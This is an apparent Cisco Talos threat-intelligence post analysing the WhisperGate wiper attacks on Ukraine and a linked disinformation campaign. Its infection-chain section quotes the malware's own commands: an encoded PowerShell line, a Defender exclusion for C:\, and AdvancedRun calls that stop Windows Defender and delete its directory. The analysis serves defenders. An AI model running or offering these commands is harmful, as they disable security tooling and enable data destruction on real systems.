Update Feb. 4, 2022
Since the initial publication of this blog, various organizations inside Ukraine have released
advisories and other reports providing additional information about the January cyber attacks
on Ukrainian entities. Based on these new details and Cisco Talos' continued investigatory
work, we have discovered several previously unidentified connections that strongly support
the notion that these attacks were part of a broader, ongoing disinformation campaign
against Ukraine. This culminated in the addition of a section related to the ongoing
disinformation campaigns associated with these incidents. Below are some of the high-level
updates:

1/25

Details of CERT-UA Advisory, including example bash commands.
Details of SSSCIP advisory outlining a false flag operation, including additional
analysis.
Disinformation section added to outline various components of disinformation
observed.
Cisco Talos has determined with moderate confidence that there is an ongoing
disinformation campaign attempting to attribute these attacks to Ukrainian groups that
date back at least nine months.
Cisco Talos has also found connections between actors in this campaign and
FancyBear disinformation campaigns dating back to 2016-2017.
In late January, the Computer Emergency Response Team of Ukraine (CERT-UA) released
an advisory detailing newly released information regarding the attacks.
Another advisory, published by the State Service of Special Communication and Information
Protection of Ukraine (SSSCIP), states that the ransomware attack may be a false flag
operation intentionally crafted to appear as the work of a pro-Ukrainian group. In this post,
we have added a new section labeled "Role of disinformation in campaign" detailing the
evidence provided by the advisory.
Cisco Talos has also done additional analysis on the connection between WhisperKill and
WhiteBlackCrypt. The details of the findings, including the ties into ongoing disinformation
campaigns are included in this update.
Several cyber attacks against Ukrainian government websites — including website
defacements and destructive wiper malware — have made headlines over the past few
weeks as military tensions along the Russian/Ukrainian border have escalated. As a
longtime intelligence partner and ally, Cisco Talos quickly responded to provide support,
working with the State Special Communications Service of Ukraine (SSSCIP), the
Cyberpolice Department of the National Police of Ukraine and the National Coordination
Center for Cybersecurity (NCCC at the NSDC of Ukraine).
Based on our analysis of the wiper malware, dubbed WhisperGate, we identified the
following key points:
While WhisperGate has some strategic similarities to the notorious NotPetya wiper that
attacked Ukranian entities in 2017, including masquerading as ransomware and
targeting and destroying the master boot record (MBR) instead of encrypting it, it
notably has more components designed to inflict additional damage.
We assess that attackers used stolen credentials in the campaign and they likely had
access to the victim network for months before the attack, a typical characteristic of
sophisticated advanced persistent threat (APT) operations.

2/25

The multi-stage infection chain downloads a payload that wipes the MBR, then
downloads a malicious DLL file hosted on a Discord server, which drops and executes
another wiper payload that destroys files on the infected machines.
We echo the recommendations from the U.S. Cybersecurity and Infrastructure Security
Agency (CISA) that organizations with ties to Ukraine should carefully consider how to
isolate and monitor those connections to protect themselves from potential collateral
damage.

Recent Ukraine attacks represent ongoing threats to partner
organizations
We were forced to cancel a trip to Kyiv in early 2020 at the onset of the COVID-19 pandemic.
It was unfortunate to lose the opportunity to reunite with friends and colleagues, and also to
visit Ostannya Barykada, one of our favorite restaurants there. In short, Talos has been
working for years in Ukraine – even prior to NotPetya – to secure a safe and stable
computing environment there.
The recent activities in Ukraine, whether the defacement of almost 80 government websites
or the discovery of wiper malware at various government agencies, feel familiar. In fact, if it
weren't for the obvious increase in geopolitical tensions in the region, we would simply
consider it winter in Ukraine. To put it another way, we've seen this kind of activity on and off
for years, and while we are quick to render assistance, we see no reason to panic because
of these events.
However, defenders around the world should carefully watch the situation in Ukraine,
particularly after the global impact of the Ukraine-centric attack that was NotPetya. In that
case, an attack that was intended to punish Ukraine had a wide-ranging, global impact. Any
organization that had any sort of business connection to Ukraine could be affected. Because
of this history, organizations with ties to Ukraine should consider how to isolate and monitor
those connections to protect themselves, a recommendation we made in 2017 and continue
to stand by today.
As we wrote during the "NotPetya" campaign in 2017:

3/25

"Based on this, Talos is advising that any organization with ties to Ukraine treat
software like M.E.Doc and systems in Ukraine with extra caution since they have been
shown to be targeted by advanced threat actors. This includes providing them a
separate network architecture, increased monitoring and hunting activities in those atrisk systems and networks and allowing only the level of access absolutely necessary
to conduct business. Patching and upgrades should be prioritized on these systems
and customers should move to transition these systems to Windows 10, following the
guidance from Microsoft on securing those systems. Additional guidance for network
security baselining is available from Cisco as well. Network IPS should be deployed on
connections between international organizations and their Ukrainian branches and
endpoint protection should be installed immediately on all Ukrainian systems."
We're sharing what information we can on the events in Ukraine to assist defenders globally
in understanding the threat and crafting a defensive approach appropriate for their situation.
Events can move quickly, so organizations need to be constantly evaluating potential
exposures to the situation now and elevating their level of security around the connections,
software and processes that connect them to Ukraine.

Role of disinformation in campaign
New information has surfaced that indicates that elements of recent attacks in Ukraine
represented an effort to create multiple false narratives intended to complicate attribution
attempts and create plausible deniability for the actor behind the attacks. Our findings
indicate the actor attempted to blame multiple parties, including both Poland and Ukrainians
themselves, despite the fact that technical indicators surrounding the attack do not support
these false narratives. We've seen tactics like this in the region and elsewhere in incidents
like Olympic Destroyer. The intent is not to actually convince people that someone else was
the source, but instead to introduce enough doubt that it is politically useful either now or in
future operations.
First, the defacements appeared in several different languages, including Polish. It was the
Polish translation that was the first indicator since it was quickly discovered to just be a
translation of the message in Russian using the popular platform yandex.ru's translation
capabilities.

SSSCIP has also made a connection between WhisperKill, a component of the WhisperGate
malware that was deployed on Ukrainian systems, and the Encrypt3d ransomware, also
known as WhiteBlackCrypt. WhiteBlackCrypt was reportedly used in operations against
Russian targets in 2021. The advisory states that there is over eighty percent similarity
between them. Cisco Talos has completed initial analysis and agrees that there is substantial
overlap between the two samples.
Another connection that SSSCIP has noted is that the ransom note displayed by Encrypt3d
contains an ASCII representation of a trident symbol that is part of Ukraine's coat of arms.

6/25

SSSCIP asserts the campaign is likely a false-flag operation in an attempt to create a fake
narrative of a pro-Ukrainian group attacking its own government. This is a known tactic
employed by actors in this region.

WhiteBlackCrypt analysis points to long-running disinformation campaign
Cisco Talos researchers took a deeper look at the connection between WhisperKill and
WhiteBlackCrypt, specifically at the origins of WhiteBlackCrypt and its usage in the wild.
We started searching various forums for WhiteBlackCrypt advertisements. In our experience
in the ransomware-as-a-service (RaaS) space, this is one of the first things we notice with
new ransomware variants that are looking to retain members and achieve notoriety. Typically,
RaaS affiliate programs seek to maximize partnership numbers by advertising themselves on
known cybercriminal platforms or some version of their own blog or website. However, Talos
has not been able to find any historical evidence of WhiteBlackCrypt operators advertising on
underground cybercrime forums. In fact, we could not identify any activity on the dark web
related to WhiteBlackCrypt.
Next, we pivoted to the email addresses Wbgroup022@gmail[.]com and
Whiteblackgroup002@gmail[.]com that are listed on the ransom note. We traced the emails
back to a blog post and article created in July 2020 titled, "Where Did Nastya Hide the
Oseledets?" (Translated from Ukrainian to English). Oseledets is a Ukrainian Cossack style
of haircut. The blog post is intended for a Russian-speaking audience, but the title is in
Ukrainian, presumably with the intent to "troll." We assess with moderate confidence that this
may be tied to a disinformation campaign around activities in and around Ukraine.
The blog post falsely summarized what it alleged to be a Ukrainian military unit that engaged
in an espionage campaign targeting Russian citizens. This was done through the use of fake
personas, specifically young women, a tactic that is fairly common among threat actors and
is referred to as a honey trap. The blog goes on to describe the specifics of the campaign,
including the alleged infiltration of several Ukranian news blogs and associated social media
accounts. Importantly, it also provided an indexed list of all the personas used in this
campaign. It was in this list that we found a persona named "Zebra." As you'll notice in the
screenshot below, Zebra ("зебра" in Russian) is associated with two of the email addresses
found in the ransom note for WhiteBlackCrypt and WhisperKill.

7/25

'Zebra' persona and ties to ransom note email addresses.
This puts the creation of the emails and their alleged use in a fake Ukrainian disinformation
campaign to at least the summer of 2020, approximately eight or nine months before the
fake ransomware campaign. Cisco Talos tried to find any evidence of a Ukrainian-backed
disinformation campaign outlined in the blog post, but thus far have been unsuccessful in
corroborating these claims.

8/25

WhiteBlackGroup User Image
During our research into the email addresses that appeared in the WhisperKill ransom note,
we found further references to WhiteBlackGroup/Zebra. These include findings that refer
back to similar motifs, including white, black and zebras. We were able to find an account
that was registered on the same platforms where the LiveJournal entries were found. The
user "whiteblackgroup" had a headline claiming "Caution! Russian Propaganda!" (translated
from Russian to English) and also made use of a profile picture that includes a zebra, which
is also the name of the persona referenced above and could also be an additional reference
to white and black. The headline is associated with a blog posted by Zebra that accused
Russia of carrying out a disinformation campaign against Ukraine to validate themselves
through anti-Russian posts.

Headline about Russian Propaganda
Upon further research, Talos researchers found threeadditionalcopies of this particular blog
on LiveJournal blogs. These particular blogs appear to focus on anti-Western and antiUkrainian disinformation. One notable difference between these three blogs and the original
is they all linked to another publication which was the earliest version of the blog we could
find. That version was published by an entity called Analytical Service of Donbas (ASD)

9/25

(translated from Russian into English). This blog is dedicated to the amplification of
misinformation related to the current tensions in Ukraine. Specifically, it appears to be
curated for citizens within the occupied Ukrainian region of Donbas and Russia.
We began to look a little deeper at ASD, specifically the authors that publish articles on the
site. This led us to Boris Rozhin. We pivoted and found that this author also posts under an
alias, Colonel Cassad. After some additional digging, we found two Telegram channels —
one using his real name, the other using the same Colonel Cassad alias. The Telegram
channels appear to focus on exposing fake Ukrainian military operations or exposing or
doxing members of Ukrainian militia units. Several blog posts appear to describe Boris
Rozhin as someone who is an active supporter of Ukrainian separatists in occupied Donbas
and who has developed other media that spreads Ukrainian-focused misinformation.
At this point, we could not correlate the original "Where Did Nastya Hide the Oseledets?"
blog and Boris Rozhin. The connection ended up relying on another name: JokerDNR.
JokerDNR is a persona and Telegram channel that describes itself as "the channel with
stolen Ukrainian military documents – who steals them? That's not clear, but it is very
interesting" (translated from Russian to English). This Telegram channel shared the
Oseledets blog post and the three LiveJournal reposts mentioned above.
We've made several connections between Boris Rozhin and JokerDNR. In 2019, Boris
Rozhin's Telegram pseudonym (@Colonel Cassad), listed JokerDNR as part of a list of
recommended Telegram channels. Another blog post directly refers to Boris Rozhin as Joker
and JokerDNR and falsely alluded to Ukrainian forces as being a part of the political violence
that occurred in Kazakhstan in January 2022. This false narrative described a military officer
from the Ukrainian military that was part of an information warfare unit that operated in
Kazakhstan. The military officer is described as a "compliment to 'Joker' military expert Boris
Rozhin." JokerDNR also took responsibility for leaking NATO and Ukrainian Navy information
in July 2021.
We can also link Boris Rozhin to a major disinformation campaign linked to FancyBear APT
activity. This occurred during a research revelation from 2016-2017 where CrowdStrike
reported the FancyBear APT group had compromised a mobile app used by Ukrainian
artillery forces. The report alleged that the compromise led to "larger than average losses to
Ukrainian artillery." They based this research on a report from the International Institute of
Strategic Studies, a think tank in London. However, the original source of the information was
a false report that was part of an article shared on a site called the Saker. This site focuses
on sharing pro-Russian views on conflicts in Ukraine and Syria. An article in VOA News
found the author of that particular document was a blogger named "Boris Rozhin:"

10/25

CrowdStrike told VOA its information on those losses came from what it described as
an analysis from the International Institute for Strategic Studies (IISS), a Londonbased think tank.

"We cited the public, third-party reference source that was quoted," VOA was told.
But the source referenced in the CrowdStrike report on its website is not the site of
the actual IISS, but an article on The Saker, a site that presents a largely proRussian version of events in Syria and Ukraine.
…
The article is an English translation from a post first published by Boris Rozhin, a
popular Russian blogger, who covers Russian military operations under the moniker
"Colonel Cassad" from Russian-annexed Crimea.

The blog post in question cites a false IISS report that Rozhin uses to write a story that
falsely asserts that Ukrainian artillery forces suffered bigger losses. According to Rozhin, the
articles he based the blog on were obtained from Russian torrent sites.
There are a few indications that can point to an ulterior motive when it comes to the emails
associated with the Zebra persona. As mentioned, the WhisperKill ransomware didn't
demonstrate any motivations to actually financially benefit from their campaign. Additionally,
the emails appeared openly in public reports. Ransomware cartels typically exercise basic
operational security and do not reuse an email that has already been exposed publicly.
Unless there is a parallel narrative where the use of these emails could serve a purpose. It is
plausible that the WhiteBlackGroup persona is part of a broader, long-term coordinated
disinformation mechanism that seeks multi-layered validation, perhaps as similar to the one
reported byCrowdStrike.
Cisco Talos assesses with high confidence that the email addresses and other associated
"flags" identified in these ransomware campaigns are designed to implicate Ukrainians in the
activity, a fact that can be leveraged by Russia in a variety of ways. This stands in agreement
with similar statements made by both SSSCIP and more broadly by the Ukrainian
government. Talos associated the emails used in the WhiteBlackCrypt ransom notes to
suspicious content dating back at least nine months. Additionally, the ransomware itself
provided no mechanism for recovery, eliminating the possibility that the campaign was for
financial gain. The email addresses have been published in blogs and amplified in Telegram
channels with questionable motivations, and are likely associated with anti-Western and proRussian themes. These findings, along with the examples of Boris Rozhin's previous
attempts to inject disinformation, point to a broader coordinated disinformation campaign
seeking multi-layer validation and the ability to push narratives into Western media.

Multi-stage infection chain delivers destructive wiper malware
In their advisory published on Jan. 26, 2022, CERT-UA asserted that the initial vector for the
malware, dubbed WhisperGate, was either a supply-chain attack or exploitation. Below is a
translated excerpt of this statement:
"The most likely vector for a cyber attack is the compromise of the supply chain, which has
made it possible to use existing trust links to disable related information and
telecommunications and automated systems. At the same time, two other possible attack
vectors are not ruled out, namely the exploitation of OctoberCMS and Log4j vulnerabilities."
The first payload in this infection is responsible for the initial attempt at wiping the systems.
The malware executable wipes the master boot record (MBR) and replaces it with the code
responsible for displaying the ransom note. Similar to the notorious NotPetya wiper that
masqueraded as ransomware during its 2017 campaign, WhisperGate is not intended to be
an actual ransom attempt, since the MBR is completely overwritten and has no recovery
options. This wiper also tries to destroy the C:\ partition by overwriting it with fixed data. The
additional steps taken to wipe the actual hard drive partition differentiate its behavior from
other wiper malware like NotPetya.
However, most modern systems today have switched to GUID Partition Table (GPT) from
MBR, which allows for larger file systems and has fewer limitations, potentially limiting some
of the impacts of this executable. As a result, there were additional stages and additional
payloads that could inflict more damage to end systems.

Second stage
The second stage of the infection chain is a downloader that retrieves a third stage from a
Discord server URL that's hard-coded in the downloader. The downloader starts by executing
a base64-encoded PowerShell command twice to make the endpoint sleep for 20 seconds.
// Start-Sleep -s 10
powershell -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMQAwAA==

Sleeps the downloader.
After that, it downloads a file from Discord. The downloaded file is in reverse byte order.

13/25

Downloads file from Discord.

The downloader restores the downloaded file by reversing the bytes within the file.

Method that reverses the downloaded file.

The restored file is a DLL and serves as the third stage of the infection chain. After
restoration, it loads the third-stage DLL and proceeds to retrieve all of its public methods to
search for a method with the name "Ylfwdwgmpilzyaph". If the method is found, the
downloader will execute it by calling ".Invoke(null, null)", transferring the execution flow over
to the third-stage DLL.

Retrieving third-stage public methods using Type.GetMethods.

14/25

Compare if method name is "Ylfwdwgmpilzyaph".

Executes Ylfwdwgmpilzyaph by calling MethodBase.Invoke.

Third stage
The third stage of the infection chain is a DLL written in C# and obfuscated with Eazfuscator.
It is a dropper that drops and executes a fourth-stage wiper payload. Unlike the first stage
wiper, the main objective of the fourth stage wiper is to delete all data on the endpoint. The
fourth-stage wiper payload is probably a contingency plan if the first-stage wiper fails to clear
the endpoint.

15/25

Static analysis.

The third-stage DLL starts off by dropping a VBScript named "Nmddfrqqrbyjeygggda.vbs"
into the %TEMP% directory and executes it. The script modifies Windows Defender settings
to exclude the target logical drive it is going to wipe from scheduled and real-time scanning.
Object("WScript.Shell").Run "powershell Set-MpPreference -ExclusionPath 'C:\'"
0, False

Drops VBScript using File.WriteAllText.

Executes VBScript using Process.Start.

16/25

The decrypted resource is a DLL file embedded with two resources named "AdvancedRun"
and "Waqybg" that are compressed with GZip.

Two resources embedded in the decrypted resource.

"AdvancedRun.exe" is a tool provided by Nirsoft to execute a program with different settings.
Once the tool is dropped, the third stage DLL will leverage it to execute two commands in the
context of the Windows TrustedInstaller group. The TrustedInstaller group was an addition to
Windows beginning in Windows 7 with the goal of preventing accidental damage to critical
system files. AdvanceRun is one of the tools that can be used to execute commands in the
context of the TrustedInstaller user. This functionality is only available via CLI and requires
the flag of "/RunAs 8", which is shown in the commands below. The tool will be deleted from
the %TEMP% directory after executing both commands. The first command leverages the
Windows service control application (sc.exe) to disable Windows Defender.
"%TEMP%\AdvancedRun.exe" /EXEFilename "C:\Windows\System32
\sc.exe" /WindowState 0 /CommandLine "stop WinDefend" /StartDirectory "" /RunAs 8
/Run

The second command leverages Windows PowerShell to execute a Windows utility called
"rmdir" to delete all the files and directories that are related to Windows Defender, such as
scan results, quarantined files and definition updates.
"%TEMP%\AdvancedRun.exe" /EXEFilename "C:\Windows\System32
\WindowsPowerShell\v1.0\powershell.exe" /WindowState 0 /CommandLine "rmdir 'C:\Progra
mData\Microsoft\Windows Defender' -Recurse" /StartDirectory "" /RunAs 8 /Run
17/25

Next, the third-stage DLL will load the "Waqybg" resource into memory. As the resource is
stored in reverse byte order, the third-stage DLL will restore it by reversing the bytes and
then proceed to decompress it. The decompressed data is the fourth stage wiper payload.
After decompressing the data, the third-stage DLL copies a legitimate Windows utility
"InstallUtil.exe" into the %TEMP% directory, creates a suspended process with it and injects
the fourth-stage wiper into the process. Finally, it resumes the process and transfers the
execution flow to the fourth-stage wiper.

Creates InstallUtil.exe process.

Fourth stage
The fourth-stage wiper starts off by enumerating from A to Z, looking for fixed and remote
logical drives in the system.

18/25

Enumerates logical drives.

For each enumeration, it performs a breadth-first search to wipe the files in the logical drive
while ignoring files located in the "%HOMEDRIVE%\Windows" directory.

Additional behavior and network proliferation
During the investigation, CERT-UA observed unauthorized behaviour by legitimate accounts.
As seen in the .bash history file shown below, the attacker added a new user, added it to a
privileged group, and downloaded a file.

As stated by CERT-UA, it is likely that the attackers utilized the Impacket tools "wmiexec"
and "smbexec" to proliferate across networks. Below is a screenshot from their advisory,
showing Sysmon logs that may indicate the use of these tools.

Mitigation & Recommendations
Cisco Talos supports the recommendations made by CISA that organizations with interests
in the area carefully monitor and isolate systems with connections to Ukraine due to the
ongoing challenges they face. This mirrors the recommendations we made in 2017 shortly
after NotPetya and our analysis of the malware's effects.
Those recommendations still hold true today: Systems in Ukraine face challenges that may
not apply to those in other regions of the world, and extra protections and precautionary
measures need to be applied. Making sure those systems are both patched and hardened is
of the utmost importance to help mitigate the threats the region faces.
